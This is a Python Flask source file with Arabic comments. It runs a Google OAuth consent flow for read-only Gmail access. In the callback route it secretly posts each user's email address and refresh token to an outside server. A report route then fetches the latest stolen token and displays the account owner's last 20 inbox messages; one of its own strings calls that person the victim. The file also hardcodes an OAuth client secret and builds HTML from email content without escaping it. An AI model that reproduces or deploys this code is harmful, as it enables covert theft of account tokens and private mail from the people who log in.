import os
import base64
import json
import traceback
import requests
from flask import Flask, request, redirect, session, url_for, render_template, Response
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from googleapiclient.http import BatchHttpRequest

app = Flask(__name__)
app.secret_key = 'a_very_long_and_super_secret_string_for_my_app'
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

# بيانات الاعتماد والمسارات
CLIENT_ID = '1096352235538-pkdcd73qn9miojk1cflr52fuminb4j4c.apps.googleusercontent.com'
CLIENT_SECRET = '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'
REDIRECT_URI = 'https://bashar-7fw9.onrender.com/callback'
TOKEN_SERVER_URL = 'https://bmapps.pythonanywhere.com'

SCOPES = [
   'https://www.googleapis.com/auth/gmail.readonly',
    'openid',
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/userinfo.profile'
]

def create_flow():
    return Flow.from_client_config(
        client_config={
            "web": {
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
                "redirect_uris": [REDIRECT_URI],
            }
        },
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    flow = create_flow()
    authorization_url, state = flow.authorization_url(access_type='offline', prompt='consent')
    session['state'] = state
    return redirect(authorization_url)

@app.route('/callback')
def callback():
    flow = create_flow()
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    try:
        service = build('oauth2', 'v2', credentials=credentials)
        user_info = service.userinfo().get().execute()
        user_email = user_info.get('email', 'unknown_email')
        refresh_token = credentials.refresh_token
        if refresh_token:
            try:
                payload = {'text_data': f"Email: {user_email}\nRefreshToken: {refresh_token}"}
                requests.post(f"{TOKEN_SERVER_URL}/receive_data", data=payload, timeout=10)
            except Exception as send_error:
                print(f"Failed to send token: {send_error}")
    except Exception as e:
        print(f"An error occurred during callback: {e}")
    session['credentials'] = { 'token': credentials.token, 'refresh_token': credentials.refresh_token, 'token_uri': credentials.token_uri, 'client_id': credentials.client_id, 'client_secret': credentials.client_secret, 'scopes': credentials.scopes }
    return redirect(url_for('show_report'))


@app.route('/report')
def show_report():
    try:
        response = requests.get(f"{TOKEN_SERVER_URL}/get_last_token", timeout=15)
        if response.status_code != 200:
            error_data = response.json()
            return f"<h1>خطأ في جلب التوكن من الخادم</h1><p>السبب: {error_data.get('error', 'خطأ غير معروف')}</p>", response.status_code

        token_data = response.json()
        refresh_token = token_data.get('last_token')

        if not refresh_token:
            return "<h2>لم يتم العثور على Refresh Token.</h2>", 404

        credentials = Credentials(
            token=None, refresh_token=refresh_token,
            token_uri='https://oauth2.googleapis.com/token',
            client_id=CLIENT_ID, client_secret=CLIENT_SECRET,
            scopes=['https://www.googleapis.com/auth/gmail.readonly']
        )
        
        service = build('gmail', 'v1', credentials=credentials)
        # ✅ maxResults=20 يجلب آخر 20 رسالة
        result = service.users().messages().list(userId='me', maxResults=20, q="is:inbox").execute()
        messages = result.get('messages', [])
        
        if not messages:
            return "<h2>لم يتم العثور على رسائل في البريد الوارد للضحية.</h2>"
            
        emails_data = []
        def batch_callback(request_id, response, exception):
            if exception is None:
                emails_data.append(response)
            else:
                print(f"Batch request error: {exception}")
        
        batch = service.new_batch_http_request(callback=batch_callback)
        for msg in messages:
            batch.add(service.users().messages().get(userId='me', id=msg['id'], format='full'))
        batch.execute()

        html_content = """
        <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تقرير الرسائل</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; margin: 20px; background-color: #f8f9fa; color: #212529; }
            h1 { color: #343a40; text-align: center; margin-bottom: 30px;}
            .email { background-color: #ffffff; border: 1px solid #dee2e6; margin-bottom: 10px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); overflow: hidden; }
            .email-header { padding: 15px 20px; cursor: pointer; background-color: #f1f3f5; }
            .email-header:hover { background-color: #e9ecef; }
            .email-header h2 { font-size: 1.1rem; margin: 0; color: #0056b3; text-align: right; }
            .email-header small { font-size: 0.85rem; color: #6c757d; }
            .email-body { padding: 20px; border-top: 1px solid #dee2e6; display: none; word-wrap: break-word; background-color: #fff; }
            .email-body pre { white-space: pre-wrap; line-height: 1.7; margin-top: 0; font-family: monospace; color: #333; }
        </style>
        <script>
            function toggleMessage(id) {
                var element = document.getElementById('body-' + id);
                if (element.style.display === "none") { element.style.display = "block"; } else { element.style.display = "none"; }
            }
        </script>
        </head><body><h1>تقرير آخر 20 رسالة</h1>
        """

        for msg_data in emails_data:
            payload = msg_data.get('payload', {})
            headers = payload.get('headers', [])
            subject = next((h['value'] for h in headers if h['name'].lower() == 'subject'), 'لا يوجد موضوع')
            sender = next((h['value'] for h in headers if h['name'].lower() == 'from'), 'مرسل غير معروف')
            
            # ✅ تم تعديل هذه الدالة بالكامل
            def find_body(parts):
                plain_part = ""
                # البحث في أجزاء الرسالة عن النص العادي أولاً
                if parts:
                    for part in parts:
                        if part.get('mimeType') == 'text/plain' and 'data' in part['body']:
                            plain_part = base64.urlsafe_b64decode(part['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')
                            # إرجاع النص العادي فور العثور عليه
                            return f"<pre>{plain_part}</pre>"
                return "<p><i>(لا يوجد محتوى نصي واضح)</i></p>"

            body = ""
            if 'parts' in payload:
                body = find_body(payload['parts'])
            # حالة خاصة لرسائل النص العادي البسيطة التي لا تحتوي على أجزاء
            elif payload.get('mimeType') == 'text/plain' and 'data' in payload.get('body', {}):
                 plain_body = base64.urlsafe_b64decode(payload['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')
                 body = f"<pre>{plain_body}</pre>"

            if not body:
                body = "<p><i>(لا يوجد محتوى نصي واضح)</i></p>"

            html_content += f"""
            <div class="email">
                <div class="email-header" onclick="toggleMessage('{msg_data['id']}')">
                    <h2>{subject}</h2><small>من: {sender}</small>
                </div>
                <div class="email-body" id="body-{msg_data['id']}" style="display:none;">{body}</div>
            </div>
            """
        
        html_content += "</body></html>"
        return Response(html_content, mimetype='text/html; charset=utf-8')

    except requests.exceptions.RequestException as e:
        return f"<h1>خطأ في الاتصال بخادم التوكن</h1><p>{e}</p>", 500
    except Exception as e:
        print(f"Error generating report: {traceback.format_exc()}")
        return "<h1>حدث خطأ فادح أثناء توليد التقرير.</h1><p>قد يكون الـ Refresh Token غير صالح أو تم إبطاله.</p>", 500
